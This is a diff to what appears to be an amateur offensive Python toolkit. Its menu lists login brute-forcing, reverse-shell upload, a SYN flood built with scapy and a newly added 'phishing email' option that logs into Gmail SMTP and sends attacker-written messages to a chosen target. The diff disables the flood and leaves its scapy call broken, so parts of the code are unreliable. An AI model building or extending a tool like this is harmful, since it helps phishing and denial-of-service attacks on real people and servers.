@@ -35,7 +35,7 @@ import scapy.all as scapy
 import mechanize
 import itertools
 import fileinput
-
+import smtplib
 
 #vars
 src_port = 10000 #CHANGE THIS
@@ -68,7 +68,7 @@ def webservertests():
 	print("[*] What would you like to do next?")
 	print("1-> brute force login")
 	print("2-> upload a reverse shell")
-	print("3-> Sql injection")
+	print("3-> Philsing email")
 	inputoption = input("[*] Option: ")
 	if (inputoption == "1"):
 		sleep(0.5)
@@ -316,7 +316,31 @@ def webservertests():
 		print ("{}".format(newoutput))
 		sleep(0.5)
 	elif (inputoption == "3"):
+		#asks for stuff
 		sleep(0.5)
+		subject = input("[*] Enter the Subject: ")
+		sleep(0.5)
+		body = input("[*] Enter the body: ")
+		sleep(0.5)
+		username = input("[*] Enter your username: ")
+		sleep(0.5)
+		password = input("[*] Enter your password: ")
+		sleep(0.5)
+		toemail = input("[*] Enter email of who you want to send it to:")
+		message = f'Subject: {subject}\n\n{body}'
+
+		#server stuff
+ 		server=smtplib.SMTP_SSL('smtp.gmail.com', 465)
+		server.login(username, password)
+		
+		#server send email
+		server.sendmail(
+			username,
+			toemail,
+			message)
+
+		#end it 
+		server.quit()
 	else:
 		sleep(0.5)
 		print("[*] Incorecct option, logging out")
@@ -430,12 +454,14 @@ def basicnettests():
 		target_ip = input("What is your target ip: ")
 		print("[*] Starting SYN Flooding..")
 		sleep(2)
+		print("[*] Currently isn't working :(...")
+		homescreen()
 		target_port = 80
 		src_IP =  RandIP()
 
 		#writing layeers
 		ip = scapy.IP(src = src_IP, dst = target_ip)
-		tcp = scapy.TCP(src_port = RandShort(), dst_port = target_port, flags = "S")
+		tcp = scapy.TCP(dst_port = target_port, flags = "S")
 		raw = Raw(b"X"*1024)
 
 		#combining layers into the packet
@@ -475,12 +501,14 @@ def networkscanner():
 	%s      %s        SMTP
 	%s      %s        DNS
 	%s      %s        HTTP
-	%s      %s        NTP
-	%s      %s        BGP
-	%s      %s        HTTPS
-	%s      %s        ISAKMP
-	%s      %s        RDP
+	%s     %s        NTP
+	%s     %s        BGP
+	%s     %s        HTTPS
+	%s     %s        ISAKMP
+	%s    %s        RDP
 	"""%(IPadders, dst_ports[0], dst_ports_status[0], dst_ports[1], dst_ports_status[1], dst_ports[2], dst_ports_status[2], dst_ports[3], dst_ports_status[3], dst_ports[4], dst_ports_status[4], dst_ports[5], dst_ports_status[5], dst_ports[6], dst_ports_status[6], dst_ports[7], dst_ports_status[7], dst_ports[8], dst_ports_status[8], dst_ports[9], dst_ports_status[9], dst_ports[10], dst_ports_status[10]))
+	homescreen()
+
 def basicwebtests():
 	#sending packets
 	#asks for IP 
